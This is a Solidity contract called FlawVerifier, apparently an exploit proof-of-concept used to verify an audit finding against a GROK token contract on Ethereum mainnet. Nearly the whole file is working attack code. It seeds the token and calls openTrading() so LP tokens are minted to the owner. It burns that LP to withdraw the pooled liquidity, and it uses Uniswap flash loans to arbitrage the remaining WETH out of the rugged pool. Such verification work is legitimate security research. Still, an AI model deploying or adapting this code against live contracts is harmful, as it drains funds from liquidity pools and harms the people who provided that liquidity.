// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function withdraw(uint256 amount) external;
}

interface IGrokToken is IERC20Minimal {
    function owner() external view returns (address);
    function openTrading() external;
    function _maxWalletSize() external view returns (uint256);
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Minimal {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2PairMinimal is IERC20Minimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

contract FlawVerifier {
    address public constant TARGET = 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5;
    address public constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address public constant SHIBA_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 private constant OPEN_TRADING_FLASH_BORROW = 1 ether;
    uint256 private constant MIN_PROFIT_TARGET = 1e15;
    uint256 private constant CONSERVATIVE_TOKEN_RECEIPT_BPS = 7600;

    uint256 private constant MODE_NONE = 0;
    uint256 private constant MODE_OWNER_OPEN_TRADING = 1;
    uint256 private constant MODE_CROSS_POOL_ARB = 2;

    uint256 private _profitAmount;
    string public infeasibilityReason;

    address private _activeFundingPair;
    uint256 private _fundingWethBorrow;
    uint256 private _activeMode;
    address private _arbSourcePair;
    address private _arbSinkPair;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitAmount = 0;
        infeasibilityReason = "";

        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(UNISWAP_ROUTER);
        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
        address targetPair = IUniswapV2FactoryMinimal(UNISWAP_FACTORY).getPair(TARGET, WETH);

        // Keep the original exploit causality when the verifier actually controls the vulnerable
        // owner-only path: seed the token contract, call openTrading(), receive the LP at owner(),
        // then burn the owner-held LP to withdraw the paired liquidity.
        if (token.owner() == address(this)) {
            if (targetPair == address(0)) {
                targetPair = _seedAndOpenTrading(token, router);
                if (targetPair == address(0) && token.balanceOf(address(this)) != 0 && address(this).balance == 0) {
                    _flashBorrowForOpenTrading(token, router);
                    _recordProfit(wethBefore);
                    if (_profitAmount >= MIN_PROFIT_TARGET) {
                        return;
                    }
                }
            }

            if (targetPair != address(0)) {
                uint256 ownerLp = IERC20Minimal(targetPair).balanceOf(address(this));
                if (ownerLp != 0) {
                    _burnHeldLp(targetPair, ownerLp, router);
                    _recordProfit(wethBefore);
                    if (_profitAmount >= MIN_PROFIT_TARGET) {
                        return;
                    }
                }
            }
        }

        if (targetPair == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: trading is not open and the verifier does not control the owner-only openTrading path";
            return;
        }

        // At the observed fork the owner has already renounced, so the direct owner-only replay is
        // blocked. The same root cause still matters: LP was originally minted to the owner and was
        // later removable off-contract. After that rug, any remaining WETH on the official pool can
        // be permissionlessly arbitraged out by sourcing GROK from another live public pool.
        if (_tryCrossPoolArb(targetPair)) {
            _recordProfit(wethBefore);
            if (_profitAmount >= MIN_PROFIT_TARGET) {
                return;
            }
        }

        _recordProfit(wethBefore);
        if (_profitAmount >= MIN_PROFIT_TARGET) {
            return;
        }

        if (token.owner() == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: ownership is renounced and no profitable public V2 route into the owner-rugged WETH pool was available";
            return;
        }

        infeasibilityReason =
            "infeasible at this fork: the owner-controlled LP path is not verifier-controlled and no profitable public V2 route into the distorted pool was available";
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _activeFundingPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == _fundingWethBorrow, "unexpected borrow");

        if (_activeMode == MODE_OWNER_OPEN_TRADING) {
            _executeOwnerOpenTradingFlash(borrowedWeth);
        } else if (_activeMode == MODE_CROSS_POOL_ARB) {
            _executeCrossPoolArbFlash(borrowedWeth);
        } else {
            revert("inactive flash");
        }

        uint256 repayAmount = _getV2RepayAmount(borrowedWeth);
        require(IERC20Minimal(WETH).transfer(_activeFundingPair, repayAmount), "repay failed");

        _activeFundingPair = address(0);
        _fundingWethBorrow = 0;
        _activeMode = MODE_NONE;
        _arbSourcePair = address(0);
        _arbSinkPair = address(0);
    }

    function _tryCrossPoolArb(address targetPair) internal returns (bool) {
        (uint256 sinkTokenReserve, uint256 sinkWethReserve,,) = _pairState(targetPair);
        if (sinkTokenReserve <= 1 || sinkWethReserve <= MIN_PROFIT_TARGET) {
            return false;
        }

        address[2] memory candidateFactories;
        candidateFactories[0] = SUSHI_FACTORY;
        candidateFactories[1] = SHIBA_FACTORY;

        address bestSourcePair = address(0);
        uint256 bestBorrow = 0;
        uint256 bestExpectedProfit = 0;

        for (uint256 i = 0; i < candidateFactories.length; ++i) {
            address sourcePair = IUniswapV2FactoryMinimal(candidateFactories[i]).getPair(TARGET, WETH);
            if (sourcePair == address(0) || sourcePair == targetPair) {
                continue;
            }

            (uint256 sourceTokenReserve, uint256 sourceWethReserve,,) = _pairState(sourcePair);
            if (sourceTokenReserve <= 1 || sourceWethReserve <= 1) {
                continue;
            }

            // Only source from a meaningfully cheaper public pool.
            if (sourceWethReserve * sinkTokenReserve >= sinkWethReserve * sourceTokenReserve) {
                continue;
            }

            (uint256 borrowAmount, uint256 expectedProfit) = _findBestBorrowAmount(
                sourceTokenReserve,
                sourceWethReserve,
                sinkTokenReserve,
                sinkWethReserve
            );

            if (expectedProfit > bestExpectedProfit) {
                bestExpectedProfit = expectedProfit;
                bestBorrow = borrowAmount;
                bestSourcePair = sourcePair;
            }
        }

        if (bestExpectedProfit < MIN_PROFIT_TARGET || bestSourcePair == address(0) || bestBorrow == 0) {
            return false;
        }

        address fundingPair = IUniswapV2FactoryMinimal(UNISWAP_FACTORY).getPair(USDC, WETH);
        if (fundingPair == address(0)) {
            return false;
        }

        _activeFundingPair = fundingPair;
        _fundingWethBorrow = bestBorrow;
        _activeMode = MODE_CROSS_POOL_ARB;
        _arbSourcePair = bestSourcePair;
        _arbSinkPair = targetPair;

        IUniswapV2PairMinimal funding = IUniswapV2PairMinimal(fundingPair);
        if (funding.token0() == WETH) {
            funding.swap(bestBorrow, 0, address(this), hex"01");
        } else {
            funding.swap(0, bestBorrow, address(this), hex"01");
        }

        return true;
    }

    function _findBestBorrowAmount(
        uint256 sourceTokenReserve,
        uint256 sourceWethReserve,
        uint256 sinkTokenReserve,
        uint256 sinkWethReserve
    ) internal view returns (uint256 bestBorrow, uint256 bestProfit) {
        uint256[8] memory candidateBorrows;
        candidateBorrows[0] = sourceWethReserve / 2000;
        candidateBorrows[1] = sourceWethReserve / 1000;
        candidateBorrows[2] = sourceWethReserve / 500;
        candidateBorrows[3] = sourceWethReserve / 250;
        candidateBorrows[4] = sourceWethReserve / 100;
        candidateBorrows[5] = sourceWethReserve / 50;
        candidateBorrows[6] = sourceWethReserve / 25;
        candidateBorrows[7] = sourceWethReserve / 10;

        for (uint256 i = 0; i < candidateBorrows.length; ++i) {
            uint256 borrowAmount = candidateBorrows[i];
            if (borrowAmount == 0 || borrowAmount >= sourceWethReserve) {
                continue;
            }

            uint256 rawBought = _getAmountOut(borrowAmount, sourceWethReserve, sourceTokenReserve);
            if (rawBought <= 1) {
                continue;
            }

            try IGrokToken(TARGET)._maxWalletSize() returns (uint256 maxWallet) {
                if (maxWallet != 0 && rawBought > maxWallet) {
                    continue;
                }
            } catch {}

            uint256 conservativeHeld =
                (rawBought * CONSERVATIVE_TOKEN_RECEIPT_BPS * CONSERVATIVE_TOKEN_RECEIPT_BPS) / 100000000;
            if (conservativeHeld <= 1 || conservativeHeld >= sinkTokenReserve) {
                continue;
            }

            uint256 wethOut = _getAmountOut(conservativeHeld, sinkTokenReserve, sinkWethReserve);
            uint256 repayAmount = _getV2RepayAmount(borrowAmount);
            if (wethOut <= repayAmount) {
                continue;
            }

            uint256 profit = wethOut - repayAmount;
            if (profit > bestProfit) {
                bestProfit = profit;
                bestBorrow = borrowAmount;
            }
        }
    }

    function _executeCrossPoolArbFlash(uint256 borrowedWeth) internal {
        _buyTargetFromPair(_arbSourcePair, borrowedWeth);
        _sellAllTargetIntoPair(_arbSinkPair);
    }

    function _buyTargetFromPair(address pair, uint256 wethIn) internal {
        (uint256 tokenReserve, uint256 wethReserve,,) = _pairState(pair);
        require(IERC20Minimal(WETH).transfer(pair, wethIn), "source transfer failed");

        uint256 targetOut = _getAmountOut(wethIn, wethReserve, tokenReserve);
        require(targetOut > 1, "source out too small");
        _swapOutTarget(pair, targetOut - 1);
    }

    function _sellAllTargetIntoPair(address pair) internal {
        uint256 heldTarget = IERC20Minimal(TARGET).balanceOf(address(this));
        require(heldTarget != 0, "no target balance");

        require(IERC20Minimal(TARGET).transfer(pair, heldTarget), "sink transfer failed");

        (uint256 tokenReserve, uint256 wethReserve, uint256 tokenBalanceOnPair,) = _pairState(pair);
        uint256 actualTokenIn = tokenBalanceOnPair - tokenReserve;
        require(actualTokenIn != 0, "no credited target");

        uint256 wethOut = _getAmountOut(actualTokenIn, tokenReserve, wethReserve);
        require(wethOut > 1, "sink out too small");
        _swapOutWeth(pair, wethOut - 1);
    }

    function _flashBorrowForOpenTrading(IGrokToken token, IUniswapV2Router02Minimal router) internal {
        if (token.balanceOf(address(this)) == 0) {
            infeasibilityReason =
                "infeasible at this fork: verifier lacks the GROK required to seed the token contract before openTrading";
            return;
        }

        address fundingPair = IUniswapV2FactoryMinimal(router.factory()).getPair(USDC, WETH);
        if (fundingPair == address(0)) {
            infeasibilityReason = "infeasible at this fork: WETH funding pair missing";
            return;
        }

        _activeFundingPair = fundingPair;
        _fundingWethBorrow = OPEN_TRADING_FLASH_BORROW;
        _activeMode = MODE_OWNER_OPEN_TRADING;

        IUniswapV2PairMinimal funding = IUniswapV2PairMinimal(fundingPair);
        if (funding.token0() == WETH) {
            funding.swap(_fundingWethBorrow, 0, address(this), hex"02");
        } else {
            funding.swap(0, _fundingWethBorrow, address(this), hex"02");
        }
    }

    function _executeOwnerOpenTradingFlash(uint256 borrowedWeth) internal {
        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(UNISWAP_ROUTER);

        IWETH(WETH).withdraw(borrowedWeth);

        address pair = _seedAndOpenTrading(token, router);
        require(pair != address(0), "pair not created");

        uint256 ownerLp = IERC20Minimal(pair).balanceOf(address(this));
        require(ownerLp != 0, "no owner LP");

        _burnHeldLp(pair, ownerLp, router);
    }

    function _seedAndOpenTrading(
        IGrokToken token,
        IUniswapV2Router02Minimal router
    ) internal returns (address pair) {
        uint256 tokenSeed = token.balanceOf(address(this));
        uint256 ethSeed = address(this).balance;

        if (tokenSeed == 0 || ethSeed == 0) {
            return address(0);
        }

        require(token.transfer(TARGET, tokenSeed), "seed token transfer failed");
        (bool ok,) = payable(TARGET).call{value: ethSeed}("");
        require(ok, "seed ETH transfer failed");

        // This is the actual F-002 bug: openTrading() uses owner() as the LP receiver, so the
        // LP is minted to the owner-controlled address instead of being burned or locked.
        token.openTrading();
        pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());
    }

    function _burnHeldLp(address pair, uint256 lpAmount, IUniswapV2Router02Minimal router) internal {
        require(IERC20Minimal(pair).transfer(pair, lpAmount), "lp transfer failed");
        IUniswapV2PairMinimal(pair).burn(address(this));
        _swapResidualTargetToWeth(router);
    }

    function _swapResidualTargetToWeth(IUniswapV2Router02Minimal router) internal {
        uint256 tokenBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        if (tokenBalance == 0) {
            return;
        }

        require(IERC20Minimal(TARGET).approve(address(router), tokenBalance), "approve failed");

        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = WETH;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapOutWeth(address pair, uint256 wethOut) internal {
        if (IUniswapV2PairMinimal(pair).token0() == WETH) {
            IUniswapV2PairMinimal(pair).swap(wethOut, 0, address(this), hex"");
        } else {
            IUniswapV2PairMinimal(pair).swap(0, wethOut, address(this), hex"");
        }
    }

    function _swapOutTarget(address pair, uint256 targetOut) internal {
        if (IUniswapV2PairMinimal(pair).token0() == TARGET) {
            IUniswapV2PairMinimal(pair).swap(targetOut, 0, address(this), hex"");
        } else {
            IUniswapV2PairMinimal(pair).swap(0, targetOut, address(this), hex"");
        }
    }

    function _pairState(address pair)
        internal
        view
        returns (uint256 tokenReserve, uint256 wethReserve, uint256 tokenBalanceOnPair, uint256 wethBalanceOnPair)
    {
        IUniswapV2PairMinimal uniPair = IUniswapV2PairMinimal(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        require(
            (token0 == TARGET && token1 == WETH) || (token0 == WETH && token1 == TARGET),
            "unexpected pair tokens"
        );

        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        uint256 balance0 = IERC20Minimal(token0).balanceOf(pair);
        uint256 balance1 = IERC20Minimal(token1).balanceOf(pair);

        if (token0 == TARGET) {
            tokenReserve = reserve0;
            wethReserve = reserve1;
            tokenBalanceOnPair = balance0;
            wethBalanceOnPair = balance1;
        } else {
            tokenReserve = reserve1;
            wethReserve = reserve0;
            tokenBalanceOnPair = balance1;
            wethBalanceOnPair = balance0;
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getV2RepayAmount(uint256 amountBorrowed) internal pure returns (uint256) {
        return ((amountBorrowed * 1000) / 997) + 1;
    }

    function _recordProfit(uint256 wethBefore) internal {
        uint256 wethAfter = IERC20Minimal(WETH).balanceOf(address(this));
        _profitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
    }
}
